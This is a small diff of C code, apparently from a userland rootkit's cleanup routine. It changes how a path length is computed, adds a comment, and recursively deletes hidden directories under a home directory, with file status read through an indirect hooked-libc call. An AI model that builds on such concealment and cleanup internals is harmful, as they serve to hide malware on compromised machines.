@@ -14,13 +14,14 @@ void bdvcleanse(void){
         if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
             continue;
 
-        pathlen = strlen(HOMEDIR) + strlen(dir->d_name) + 2;
+        pathlen = LEN_HOMEDIR + strlen(dir->d_name) + 2;
         char path[pathlen];
         snprintf(path, sizeof(path), "%s/%s", HOMEDIR, dir->d_name);
 
         memset(&pathstat, 0, sizeof(struct stat));
         lstatstat = (long)call(C__LXSTAT, _STAT_VER, path, &pathstat);
 
+        // remove hidden home directories created by various things...
         if(dir->d_name[0] == '.' && S_ISDIR(pathstat.st_mode)){
             eradicatedir(path);
             continue;
